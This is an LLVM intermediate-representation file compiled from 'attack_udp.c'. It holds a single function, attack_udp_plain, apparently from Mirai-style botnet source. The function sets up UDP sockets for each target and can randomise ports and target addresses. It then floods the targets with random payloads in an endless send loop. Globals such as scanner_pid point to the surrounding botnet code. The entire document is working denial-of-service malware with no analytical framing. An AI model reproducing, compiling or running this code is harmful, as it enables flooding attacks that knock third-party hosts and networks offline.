; ModuleID = 'attack_udp.c'
source_filename = "attack_udp.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-pc-linux-gnu"

%struct.attack_target = type { %struct.sockaddr_in, i32, i8 }
%struct.sockaddr_in = type { i16, i16, %struct.in_addr, [8 x i8] }
%struct.in_addr = type { i32 }
%struct.attack_option = type { i8*, i8 }
%union.__CONST_SOCKADDR_ARG = type { %struct.sockaddr* }
%struct.sockaddr = type { i16, [14 x i8] }

@pid1 = dso_local global i32 0, align 4
@pid2 = dso_local global i32 0, align 4
@scanner_pid = dso_local global i32 0, align 4
@spid = dso_local global i32 0, align 4
@maintain_thread = dso_local global i32 0, align 4
@mainpid = dso_local global i32 0, align 4
@LOCAL_ADDR = dso_local global i32 0, align 4

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local void @attack_udp_plain(i8 zeroext %0, %struct.attack_target* %1, i8 zeroext %2, %struct.attack_option* %3) #0 {
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i8**, align 8
  %11 = alloca i32*, align 8
  %12 = alloca i16, align 2
  %13 = alloca i16, align 2
  %14 = alloca i16, align 2
  %15 = alloca i8, align 1
  %16 = alloca %struct.sockaddr_in, align 4
  %17 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %18 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %19 = alloca i8*, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %20 = load i8, i8* %5, align 1
  %21 = zext i8 %20 to i64
  %22 = call noalias align 16 i8* @calloc(i64 %21, i64 8) #5
  %23 = bitcast i8* %22 to i8**
  store i8** %23, i8*** %10, align 8
  %24 = load i8, i8* %5, align 1
  %25 = zext i8 %24 to i64
  %26 = call noalias align 16 i8* @calloc(i64 %25, i64 4) #5
  %27 = bitcast i8* %26 to i32*
  store i32* %27, i32** %11, align 8
  %28 = load i8, i8* %7, align 1
  %29 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %30 = call i32 @attack_get_opt_int(i8 zeroext %28, %struct.attack_option* %29, i8 zeroext 7, i32 65535)
  %31 = trunc i32 %30 to i16
  store i16 %31, i16* %12, align 2
  %32 = load i8, i8* %7, align 1
  %33 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %34 = call i32 @attack_get_opt_int(i8 zeroext %32, %struct.attack_option* %33, i8 zeroext 6, i32 65535)
  %35 = trunc i32 %34 to i16
  store i16 %35, i16* %13, align 2
  %36 = load i8, i8* %7, align 1
  %37 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %38 = call i32 @attack_get_opt_int(i8 zeroext %36, %struct.attack_option* %37, i8 zeroext 0, i32 512)
  %39 = trunc i32 %38 to i16
  store i16 %39, i16* %14, align 2
  %40 = load i8, i8* %7, align 1
  %41 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %42 = call i32 @attack_get_opt_int(i8 zeroext %40, %struct.attack_option* %41, i8 zeroext 1, i32 1)
  %43 = trunc i32 %42 to i8
  store i8 %43, i8* %15, align 1
  %44 = bitcast %struct.sockaddr_in* %16 to i8*
  call void @llvm.memset.p0i8.i64(i8* align 4 %44, i8 0, i64 16, i1 false)
  %45 = load i16, i16* %13, align 2
  %46 = zext i16 %45 to i32
  %47 = icmp eq i32 %46, 65535
  br i1 %47, label %48, label %51

48:                                               ; preds = %4
  %49 = call i32 @rand_next()
  %50 = trunc i32 %49 to i16
  store i16 %50, i16* %13, align 2
  br label %54

51:                                               ; preds = %4
  %52 = load i16, i16* %13, align 2
  %53 = call zeroext i16 @htons(i16 zeroext %52) #6
  store i16 %53, i16* %13, align 2
  br label %54

54:                                               ; preds = %51, %48
  store i32 0, i32* %9, align 4
  br label %55

55:                                               ; preds = %167, %54
  %56 = load i32, i32* %9, align 4
  %57 = load i8, i8* %5, align 1
  %58 = zext i8 %57 to i32
  %59 = icmp slt i32 %56, %58
  br i1 %59, label %60, label %170

60:                                               ; preds = %55
  %61 = call noalias align 16 i8* @calloc(i64 65535, i64 1) #5
  %62 = load i8**, i8*** %10, align 8
  %63 = load i32, i32* %9, align 4
  %64 = sext i32 %63 to i64
  %65 = getelementptr inbounds i8*, i8** %62, i64 %64
  store i8* %61, i8** %65, align 8
  %66 = load i16, i16* %12, align 2
  %67 = zext i16 %66 to i32
  %68 = icmp eq i32 %67, 65535
  br i1 %68, label %69, label %78

69:                                               ; preds = %60
  %70 = call i32 @rand_next()
  %71 = trunc i32 %70 to i16
  %72 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %73 = load i32, i32* %9, align 4
  %74 = sext i32 %73 to i64
  %75 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %72, i64 %74
  %76 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %75, i32 0, i32 0
  %77 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %76, i32 0, i32 1
  store i16 %71, i16* %77, align 2
  br label %87

78:                                               ; preds = %60
  %79 = load i16, i16* %12, align 2
  %80 = call zeroext i16 @htons(i16 zeroext %79) #6
  %81 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %82 = load i32, i32* %9, align 4
  %83 = sext i32 %82 to i64
  %84 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %81, i64 %83
  %85 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %84, i32 0, i32 0
  %86 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %85, i32 0, i32 1
  store i16 %80, i16* %86, align 2
  br label %87

87:                                               ; preds = %78, %69
  %88 = call i32 @socket(i32 2, i32 2, i32 17) #5
  %89 = load i32*, i32** %11, align 8
  %90 = load i32, i32* %9, align 4
  %91 = sext i32 %90 to i64
  %92 = getelementptr inbounds i32, i32* %89, i64 %91
  store i32 %88, i32* %92, align 4
  %93 = icmp eq i32 %88, -1
  br i1 %93, label %94, label %95

94:                                               ; preds = %87
  ret void

95:                                               ; preds = %87
  %96 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 0
  store i16 2, i16* %96, align 4
  %97 = load i16, i16* %13, align 2
  %98 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 1
  store i16 %97, i16* %98, align 2
  %99 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 2
  %100 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %99, i32 0, i32 0
  store i32 0, i32* %100, align 4
  %101 = load i32*, i32** %11, align 8
  %102 = load i32, i32* %9, align 4
  %103 = sext i32 %102 to i64
  %104 = getelementptr inbounds i32, i32* %101, i64 %103
  %105 = load i32, i32* %104, align 4
  %106 = bitcast %union.__CONST_SOCKADDR_ARG* %17 to %struct.sockaddr**
  %107 = bitcast %struct.sockaddr_in* %16 to %struct.sockaddr*
  store %struct.sockaddr* %107, %struct.sockaddr** %106, align 8
  %108 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %17, i32 0, i32 0
  %109 = load %struct.sockaddr*, %struct.sockaddr** %108, align 8
  %110 = call i32 @bind(i32 %105, %struct.sockaddr* %109, i32 16) #5
  %111 = icmp eq i32 %110, -1
  br i1 %111, label %112, label %113

112:                                              ; preds = %95
  br label %113

113:                                              ; preds = %112, %95
  %114 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %115 = load i32, i32* %9, align 4
  %116 = sext i32 %115 to i64
  %117 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %114, i64 %116
  %118 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %117, i32 0, i32 2
  %119 = load i8, i8* %118, align 4
  %120 = zext i8 %119 to i32
  %121 = icmp slt i32 %120, 32
  br i1 %121, label %122, label %148

122:                                              ; preds = %113
  %123 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %124 = load i32, i32* %9, align 4
  %125 = sext i32 %124 to i64
  %126 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %123, i64 %125
  %127 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %126, i32 0, i32 1
  %128 = load i32, i32* %127, align 4
  %129 = call i32 @ntohl(i32 %128) #6
  %130 = call i32 @rand_next()
  %131 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %132 = load i32, i32* %9, align 4
  %133 = sext i32 %132 to i64
  %134 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %131, i64 %133
  %135 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %134, i32 0, i32 2
  %136 = load i8, i8* %135, align 4
  %137 = zext i8 %136 to i32
  %138 = lshr i32 %130, %137
  %139 = add i32 %129, %138
  %140 = call i32 @htonl(i32 %139) #6
  %141 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %142 = load i32, i32* %9, align 4
  %143 = sext i32 %142 to i64
  %144 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %141, i64 %143
  %145 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %144, i32 0, i32 0
  %146 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %145, i32 0, i32 2
  %147 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %146, i32 0, i32 0
  store i32 %140, i32* %147, align 4
  br label %148

148:                                              ; preds = %122, %113
  %149 = load i32*, i32** %11, align 8
  %150 = load i32, i32* %9, align 4
  %151 = sext i32 %150 to i64
  %152 = getelementptr inbounds i32, i32* %149, i64 %151
  %153 = load i32, i32* %152, align 4
  %154 = bitcast %union.__CONST_SOCKADDR_ARG* %18 to %struct.sockaddr**
  %155 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %156 = load i32, i32* %9, align 4
  %157 = sext i32 %156 to i64
  %158 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %155, i64 %157
  %159 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %158, i32 0, i32 0
  %160 = bitcast %struct.sockaddr_in* %159 to %struct.sockaddr*
  store %struct.sockaddr* %160, %struct.sockaddr** %154, align 8
  %161 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %18, i32 0, i32 0
  %162 = load %struct.sockaddr*, %struct.sockaddr** %161, align 8
  %163 = call i32 @connect(i32 %153, %struct.sockaddr* %162, i32 16)
  %164 = icmp eq i32 %163, -1
  br i1 %164, label %165, label %166

165:                                              ; preds = %148
  br label %166

166:                                              ; preds = %165, %148
  br label %167

167:                                              ; preds = %166
  %168 = load i32, i32* %9, align 4
  %169 = add nsw i32 %168, 1
  store i32 %169, i32* %9, align 4
  br label %55, !llvm.loop !6

170:                                              ; preds = %55
  br label %171

171:                                              ; preds = %170, %202
  store i32 0, i32* %9, align 4
  br label %172

172:                                              ; preds = %199, %171
  %173 = load i32, i32* %9, align 4
  %174 = load i8, i8* %5, align 1
  %175 = zext i8 %174 to i32
  %176 = icmp slt i32 %173, %175
  br i1 %176, label %177, label %202

177:                                              ; preds = %172
  %178 = load i8**, i8*** %10, align 8
  %179 = load i32, i32* %9, align 4
  %180 = sext i32 %179 to i64
  %181 = getelementptr inbounds i8*, i8** %178, i64 %180
  %182 = load i8*, i8** %181, align 8
  store i8* %182, i8** %19, align 8
  %183 = load i8, i8* %15, align 1
  %184 = icmp ne i8 %183, 0
  br i1 %184, label %185, label %189

185:                                              ; preds = %177
  %186 = load i8*, i8** %19, align 8
  %187 = load i16, i16* %14, align 2
  %188 = zext i16 %187 to i32
  call void @rand_str(i8* %186, i32 %188)
  br label %189

189:                                              ; preds = %185, %177
  %190 = load i32*, i32** %11, align 8
  %191 = load i32, i32* %9, align 4
  %192 = sext i32 %191 to i64
  %193 = getelementptr inbounds i32, i32* %190, i64 %192
  %194 = load i32, i32* %193, align 4
  %195 = load i8*, i8** %19, align 8
  %196 = load i16, i16* %14, align 2
  %197 = zext i16 %196 to i64
  %198 = call i64 @send(i32 %194, i8* %195, i64 %197, i32 16384)
  br label %199

199:                                              ; preds = %189
  %200 = load i32, i32* %9, align 4
  %201 = add nsw i32 %200, 1
  store i32 %201, i32* %9, align 4
  br label %172, !llvm.loop !8

202:                                              ; preds = %172
  br label %171
}

; Function Attrs: nounwind
declare noalias align 16 i8* @calloc(i64, i64) #1

declare i32 @attack_get_opt_int(i8 zeroext, %struct.attack_option*, i8 zeroext, i32) #2

; Function Attrs: argmemonly nofree nounwind willreturn writeonly
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i1 immarg) #3

declare i32 @rand_next() #2

; Function Attrs: nounwind readnone willreturn
declare zeroext i16 @htons(i16 zeroext) #4

; Function Attrs: nounwind
declare i32 @socket(i32, i32, i32) #1

; Function Attrs: nounwind
declare i32 @bind(i32, %struct.sockaddr*, i32) #1

; Function Attrs: nounwind readnone willreturn
declare i32 @htonl(i32) #4

; Function Attrs: nounwind readnone willreturn
declare i32 @ntohl(i32) #4

declare i32 @connect(i32, %struct.sockaddr*, i32) #2

declare void @rand_str(i8*, i32) #2

declare i64 @send(i32, i8*, i64, i32) #2

attributes #0 = { noinline nounwind optnone sspstrong uwtable "frame-pointer"="all" "min-legal-vector-width"="0" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #1 = { nounwind "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #2 = { "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #3 = { argmemonly nofree nounwind willreturn writeonly }
attributes #4 = { nounwind readnone willreturn "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #5 = { nounwind }
attributes #6 = { nounwind readnone willreturn }

!llvm.module.flags = !{!0, !1, !2, !3, !4}
!llvm.ident = !{!5}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{i32 7, !"PIC Level", i32 2}
!2 = !{i32 7, !"PIE Level", i32 2}
!3 = !{i32 7, !"uwtable", i32 1}
!4 = !{i32 7, !"frame-pointer", i32 2}
!5 = !{!"clang version 13.0.1"}
!6 = distinct !{!6, !7}
!7 = !{!"llvm.loop.mustprogress"}
!8 = distinct !{!8, !7}
